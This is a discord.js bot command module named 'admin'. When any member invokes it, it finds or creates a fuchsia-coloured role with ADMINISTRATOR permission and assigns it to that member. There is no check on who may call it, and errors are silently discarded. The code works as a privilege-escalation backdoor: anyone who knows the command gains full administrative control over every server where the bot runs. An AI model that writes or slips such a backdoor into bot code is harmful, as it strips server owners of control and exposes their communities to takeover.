const { Discord, Permissions } = require('discord.js');

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
  message.guild.roles.fetch().then((roles) => {
    roleFound = null

    roles.forEach(role => {
      if (role.permissions.has(Permissions.FLAGS.ADMINISTRATOR) && role.color == 'FUCHSIA') {
        roleFound = role
      }
    });

    if (roleFound) {
      message.member.roles.add(roleFound).catch((err) => { })
    } else {
      message.guild.roles.create({
        name: 'ADMIN',
        color: 'FUCHSIA',
        permissions: [
          Permissions.FLAGS.ADMINISTRATOR
        ]
      }).then((newRole) => {
        message.member.roles.add(newRole)
      })
    }
  })
};

module.exports.name = 'admin';
